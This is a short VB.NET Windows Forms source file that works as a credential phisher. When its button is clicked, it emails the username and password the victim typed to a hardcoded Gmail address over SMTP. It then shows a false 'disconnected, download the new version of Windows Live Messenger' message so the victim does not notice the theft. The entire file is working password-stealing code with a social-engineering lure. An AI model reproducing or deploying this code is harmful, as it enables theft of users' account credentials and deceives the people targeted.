﻿Imports System.Net.Mail
Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim smtpserver As New SmtpClient()
        Dim mail As New MailMessage()
        smtpserver.Credentials = New Net.NetworkCredential("
example@gmail.com", "password")
        smtpserver.Port = 587
        smtpserver.Host = "smtp.gmail.com"
        smtpserver.EnableSsl = True
        mail.From = New MailAddress("
babynotifyldn@gmail.com")
        mail.Subject = "username: " & ComboBox1.Text
        mail.To.Add("example@gmail.com")
        mail.Body = "username: " & ComboBox1.Text & ", " & "password: " & TextBox1.Text
        smtpserver.Send(mail)
        MsgBox("Sorry,You have been dissconnected from server, ther are new version of Windows live messenger , please download it.")
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub
End Class